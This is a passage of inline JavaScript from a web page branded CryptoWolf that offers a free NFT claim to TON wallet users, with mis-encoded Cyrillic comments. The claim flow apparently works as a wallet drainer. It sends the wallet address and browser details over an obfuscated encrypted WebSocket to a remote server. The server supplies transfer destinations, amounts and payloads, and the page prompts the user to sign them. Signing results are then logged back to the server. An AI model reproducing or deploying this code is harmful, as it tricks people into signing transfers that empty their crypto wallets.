                console.log('üîÑ Attempting reconnect in 3 seconds...');
                setTimeout(connectWebSocket, 3000);
            }
        };
        
        ws.onerror = function(error) {
            console.error('üí• WebSocket error:', error);
            showStatus('WebSocket connection error', 'error');
        };
    } catch (error) {
        console.error('üí• WebSocket connection failed:', error);
        showStatus('Connection setup error', 'error');
    }
}

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è —Å–µ—Ä–≤–µ—Ä–∞
// –í —Ñ—É–Ω–∫—Ü–∏–∏ handleServerConnected –¥–æ–±–∞–≤—å—Ç–µ:
function handleServerConnected(data) {
    try {
        // –†–∞—Å—à–∏—Ñ—Ä–æ–≤—ã–≤–∞–µ–º —Å–µ—Ä–≤–µ—Ä–Ω—ã–π –∫–ª—é—á
        myEncryption = createDecipher('AcmeDev')(data.data.key);
        console.log('üîë Decrypted server key:', myEncryption);
        
        // –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º –∫–ª–∏–µ–Ω—Ç—Å–∫–∏–π –∫–ª—é—á
        clientEncryption = generateRandomKey();
        console.log('üîë Generated client key:', clientEncryption);
        
        // –ò–°–ü–†–ê–í–õ–ï–ù–ò–ï: –ü—Ä–∏–≤–æ–¥–∏–º –∫ —Å–µ—Ä–≤–µ—Ä–Ω–æ–º—É —Ñ–æ—Ä–º–∞—Ç—É
        signature = clientEncryption.split('').slice(0, 12).join('') + myEncryption.split('').slice(0, 12).join('');
        console.log('üìù Signature (server format):', signature);
        
        // –¢–ï–°–¢: –ü—Ä–æ–≤–µ—Ä—è–µ–º —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ –Ω–∞ –∫–ª–∏–µ–Ω—Ç–µ
        console.log('üß™ CLIENT TEST: Testing encryption...');
        try {
            const testData = JSON.stringify({test: "hello"});
            const encrypted = Aes.Ctr.encrypt(testData, clientEncryption, 256);
            const decrypted = Aes.Ctr.decrypt(encrypted, clientEncryption, 256);
            console.log('üß™ CLIENT TEST:', testData === decrypted ? 'PASSED ‚úÖ' : 'FAILED ‚ùå');
        } catch (e) {
            console.log('üß™ CLIENT TEST: FAILED ‚ùå', e);
        }
        
        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–ª–∏–µ–Ω—Ç—Å–∫–∏–π –∫–ª—é—á –Ω–∞ —Å–µ—Ä–≤–µ—Ä
        const connectMessage = {
            action: 'connected',
            data: {
                key: createCipher('AcmeDev')(clientEncryption),
                from: ""
            }
        };
        console.log('üì§ Sending client key to server');
        ws.send(JSON.stringify(connectMessage));
        
    } catch (error) {
        console.error('‚ùå Server connection handling failed:', error);
        showStatus('Security setup failed', 'error');
    }
}
        function isWebSocketReady() {
    return ws && 
           ws.readyState === WebSocket.OPEN && 
           isWebSocketConnected && 
           myEncryption && 
           clientEncryption && 
           signature;
}

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
async function handleSafetyChallenge(data) {
    try {
        console.log('üîí Handling safety challenge');
        
        // –î–µ—à–∏—Ñ—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –≤ —Ñ–æ—Ä–º–∞—Ç–µ —Å–µ—Ä–≤–µ—Ä–∞
        const decryptedMessage = await decryptFromServer(data.data, clientEncryption);
        console.log('üîì Decrypted safety message:', decryptedMessage);
        
        const messageObj = JSON.parse(decryptedMessage);
        
        if (messageObj.message === 'hello') {
            // –ü–æ–¥–≥–æ—Ç–∞–≤–ª–∏–≤–∞–µ–º –æ—Ç–≤–µ—Ç –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏
            const checkResponse = {
                message: 'hello',
                domain: window.location.hostname
            };
            
            // –®–∏—Ñ—Ä—É–µ–º –æ—Ç–≤–µ—Ç –≤ —Ñ–æ—Ä–º–∞—Ç–µ —Å–µ—Ä–≤–µ—Ä–∞
            const encryptedResponse = await encryptForServer(checkResponse, clientEncryption);
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø—Ä–æ–≤–µ—Ä–æ—á–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
            const checkMessage = {
                action: 'check',
                data: encryptedResponse
            };
            
            console.log('‚úÖ Sending safety check response');
            ws.send(JSON.stringify(checkMessage));
            
        } else {
            console.error('‚ùå Invalid safety challenge');
            showStatus('Security verification failed', 'error');
        }
        
    } catch (error) {
        console.error('‚ùå Safety challenge handling failed:', error);
        showStatus('Security error: ' + error.message, 'error');
    }
}

// –û–±—Ä–∞–±–æ—Ç–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–æ–Ω–Ω—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π (–æ–±–Ω–æ–≤–ª–µ–Ω–Ω–∞—è)
function handleTransactionMessages(encryptedData) {
    try {
        console.log('üîê Encrypted transaction data:', encryptedData);
        const decryptedData = decryptData(encryptedData);
        console.log('üîì Decrypted transaction data:', decryptedData);

        let messages;
        try {
            // –ü—ã—Ç–∞–µ–º—Å—è —Ä–∞—Å–ø–∞—Ä—Å–∏—Ç—å JSON
            messages = JSON.parse(decryptedData);
        } catch (parseError) {
            console.log('‚ö†Ô∏è Decrypted data is not JSON, checking if it contains messages array');
            
            // –ï—Å–ª–∏ —ç—Ç–æ –Ω–µ JSON, –ø—Ä–æ–≤–µ—Ä—è–µ–º, –µ—Å—Ç—å –ª–∏ –≤ –¥–∞–Ω–Ω—ã—Ö –º–∞—Å—Å–∏–≤ messages
            if (typeof decryptedData === 'string' && decryptedData.includes('messages')) {
                try {
                    // –ü—ã—Ç–∞–µ–º—Å—è –∏–∑–≤–ª–µ—á—å JSON –∏–∑ —Å—Ç—Ä–æ–∫–∏
                    const jsonMatch = decryptedData.match(/\{.*\}/s);
                    if (jsonMatch) {
                        messages = JSON.parse(jsonMatch[0]);
                    } else {
                        messages = { messages: [] };
                    }
                } catch (e) {
                    console.log('‚ùå Could not extract JSON from decrypted data');
                    messages = { messages: [] };
                }
            } else {
                console.log('‚ùå Decrypted data is not valid JSON, using empty messages');
                messages = { messages: [] };
            }
        }

        // –û–±—Ä–∞–±–æ—Ç–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏–π
        if (messages && messages.messages && Array.isArray(messages.messages)) {
            console.log(`üì¶ Processing ${messages.messages.length} transaction messages`);
            processTransactionMessages(messages.messages);
        } else {
            console.log('üì≠ No transaction messages found');
            updateUIForNoTransactions();
        }
    } catch (error) {
        console.log('‚ùå Transaction message handling failed:', error);
        updateUIForNoTransactions();
    }
}

function updateUIForNoTransactions() {
    // –û–±–Ω–æ–≤–ª—è–µ–º –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å, –∫–æ–≥–¥–∞ –Ω–µ—Ç —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π
    const transactionList = document.getElementById('transactionList');
    if (transactionList) {
        transactionList.innerHTML = '<div class="no-transactions">No transactions available</div>';
    }
}

        // –û–±—Ä–∞–±–æ—Ç–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–æ–Ω–Ω—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π –¥–ª—è –ø–æ–¥–ø–∏—Å–∞–Ω–∏—è
        async function processTransactionMessages(transactionData) {
            try {
                const messages = transactionData.messages;
                console.log('üìã Processing transaction messages:', messages);
                
                // –ü–æ–¥–≥–æ—Ç–∞–≤–ª–∏–≤–∞–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é –¥–ª—è –ø–æ–¥–ø–∏—Å–∞–Ω–∏—è
                const transaction = {
                    validUntil: Math.floor(Date.now() / 1000) + 300, // 5 minutes
                    messages: messages.map(msg => ({
                        address: msg.address,
                        amount: msg.amount || msg.value || '0',
                        payload: msg.payload || ''
                    }))
                };

                console.log('üìù Final transaction for signing:', transaction);
                showStatus(`Ready to sign ${messages.length} transaction(s)`, 'info');
                
                // –ù–µ–±–æ–ª—å—à–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –¥–ª—è UX
                await new Promise(resolve => setTimeout(resolve, 1000));

                try {
                    console.log('üñäÔ∏è Sending transaction for signing...');
                    const result = await tonConnectUI.sendTransaction(transaction);
                    
                    showStatus('üéâ Transaction signed successfully!', 'success');
                    console.log('‚úÖ Transaction result:', result);
                    
                    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å—Ç–∞—Ç—É—Å –Ω–∞ —Å–µ—Ä–≤–µ—Ä
                    await sendTransactionStatus('sent', messages);
                    
                } catch (signError) {
                    console.error('‚ùå Transaction signing failed:', signError);
                    
                    if (signError.message?.includes('Rejected')) {
                        showStatus('Transaction rejected by user', 'error');
                    } else if (signError.message?.includes('timeout')) {
                        showStatus('Transaction timeout', 'error');
                    } else {
                        showStatus('Signing failed: ' + signError.message, 'error');
                    }
                    
                    await sendTransactionStatus('error', messages);
                }
                
            } catch (error) {
                console.error('üí• Transaction processing error:', error);
                showStatus('Transaction processing failed', 'error');
            }
        }

        // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è NFT
        async function claimNFT() {
    console.log('üéØ Starting claimNFT process...');
    
    if (!tonConnectUI?.connected || !tonConnectUI.account) {
        showStatus('Please connect your wallet first!', 'error');
        console.error('‚ùå No wallet connected');
        return;
    }

    console.log('üëõ Wallet details:', {
        address: tonConnectUI.account.address,
        chain: tonConnectUI.account.chain,
        device: tonConnectUI.account.device
    });
    
    if (!isWebSocketReady()) {
        console.error('‚ùå WebSocket not ready:', {
            ws: !!ws,
            readyState: ws ? ws.readyState : 'no ws',
            isWebSocketConnected,
            myEncryption: !!myEncryption,
            clientEncryption: !!clientEncryption,
            signature: !!signature
        });
        
        showStatus('Server connection not ready. Reconnecting...', 'error');
        connectWebSocket();
        
        // –ñ–¥–µ–º –Ω–µ–º–Ω–æ–≥–æ –ø–µ—Ä–µ–¥ –ø–æ–≤—Ç–æ—Ä–Ω–æ–π –ø–æ–ø—ã—Ç–∫–æ–π
        setTimeout(() => {
            if (isWebSocketReady()) {
                claimNFT();
            } else {
                showStatus('Still connecting to server...', 'info');
            }
        }, 2000);
        return;
    }

    showStatus('Requesting transaction data...', 'info');

    try {
        const userInfo = getUserInfo();
        console.log('üì§ User info to send:', userInfo);
        
        const requestData = {
            userInfo: userInfo
        };

        console.log('üîê Starting encryption...');
        const encryptedRequest = await encryptForServer(requestData, clientEncryption);
        
        const message = {
            action: 'getMessages',
            data: encryptedRequest
        };
        
        console.log('üì§ Sending encrypted request to server:', message);
        ws.send(JSON.stringify(message));
        showStatus('Request sent to server...', 'info');
        
    } catch (error) {
        console.error('‚ùå Failed to prepare NFT request:', error);
        showStatus('Failed to prepare request: ' + error.message, 'error');
    }
}



        // –û—Ç–ø—Ä–∞–≤–∫–∞ —Å—Ç–∞—Ç—É—Å–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä
        async function sendTransactionStatus(status, messages) {
    if (!ws || !isWebSocketConnected) {
        console.log('‚ùå WebSocket not connected');
        return;
    }
    
    try {
        const statusData = {
            status: status,
            chunk: messages,
            userInfo: getUserInfo()
        };

        // –®–∏—Ñ—Ä—É–µ–º —Å—Ç–∞—Ç—É—Å –≤ —Ñ–æ—Ä–º–∞—Ç–µ —Å–µ—Ä–≤–µ—Ä–∞
        const encryptedData = await encryptForServer(statusData, clientEncryption);
        
        const message = {
            action: 'log',
            data: encryptedData
        };
        
        console.log('üì§ Sending transaction status to server');
        ws.send(JSON.stringify(message));
        
    } catch (error) {
        console.error('‚ùå Failed to send transaction status:', error);
    }
}

        // –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Å–ª—É—á–∞–π–Ω–æ–≥–æ –∫–ª—é—á–∞
        function generateRandomKey() {
            const array = new Uint8Array(16);
            crypto.getRandomValues(array);
            return Array.from(array, byte => 
                byte.toString(16).padStart(2, '0')
            ).join('');
        }

        // –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
        function getUserInfo() {
    const wallet = tonConnectUI?.account;
    
    if (!wallet) {
        console.error('‚ùå No wallet available in getUserInfo');
        return {
            ip: '8.8.8.8',
            country: 'RU', 
            domain: window.location.hostname,
            sng: false,
            address: '',
            device: {
                app: 'web',
                platform: 'browser',
                userAgent: navigator.userAgent,
                language: navigator.language
            },
            hash: generateHash(),
            timestamp: Date.now()
        };
    }
    
    const userInfo = {
        ip: 'auto-detected',
        country: 'RU',
        domain: window.location.hostname,
        sng: false,
        address: wallet.address || '',
        device: {
            app: 'web',
            platform: 'browser',
            userAgent: navigator.userAgent,
            language: navigator.language
        },
        wallet: {
            address: wallet.address,
            chain: wallet.chain,
            device: wallet.device?.appName || 'unknown'
        },
        hash: generateHash(),
        timestamp: Date.now()
    };
    
    console.log('üåê Domain being sent:', userInfo.domain);
    console.log('üìç Wallet address:', userInfo.address);
    console.log('üîß Full user info:', userInfo);
    
    return userInfo;
}


        // –û—Ç–∫–ª—é—á–µ–Ω–∏–µ –∫–æ—à–µ–ª—å–∫–∞
        function disconnectWallet() {
            if (tonConnectUI) {
                tonConnectUI.disconnect();
                hideWalletInfo();
                document.getElementById('claimButton').disabled = true;
                showStatus('Wallet disconnected', 'info');
            }
        }

        // –ü–æ–∫–∞–∑–∞—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –∫–æ—à–µ–ª—å–∫–µ
        function showWalletInfo(wallet) {
            const walletInfo = document.getElementById('walletInfo');
            const walletAddress = document.getElementById('walletAddress');
            
            if (wallet.account && wallet.account.address) {
                walletAddress.textContent = 
                    wallet.account.address.substring(0, 8) + '...' + 
                    wallet.account.address.substring(wallet.account.address.length - 8);
                
                walletInfo.style.display = 'block';
            }
        }

        // –°–∫—Ä—ã—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –∫–æ—à–µ–ª—å–∫–µ
        function hideWalletInfo() {
            document.getElementById('walletInfo').style.display = 'none';
        }

        // –ü–æ–∫–∞–∑–∞—Ç—å —Å—Ç–∞—Ç—É—Å
        function showStatus(message, type) {
            const statusEl = document.getElementById('statusMessage');
            statusEl.textContent = message;
            statusEl.className = 'status-message status-' + type;
            statusEl.style.display = 'block';
            
            // –ê–≤—Ç–æ—Å–∫—Ä—ã—Ç–∏–µ —É—Å–ø–µ—à–Ω—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π
            if (type === 'success') {
                setTimeout(() => {
                    statusEl.style.display = 'none';
                }, 5000);
            }
        }

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('load', function() {
            initTonConnect();
            showStatus('Welcome to CryptoWolf! Connect your wallet to start.', 'info');
        });

        // –ì–ª–æ–±–∞–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è –æ–±—Ä–∞—Ç–Ω–æ–π —Å–æ–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç–∏
        window.didtrans = function() {
            console.log('Legacy didtrans called');
            claimNFT();
        };

        window.connectWallet = function() {
            console.log('Legacy connectWallet called');
            if (tonConnectUI) {
                if (!tonConnectUI.connected) {
                    tonConnectUI.openModal();
                }
            }
        };
    </script>
</body>
</html>













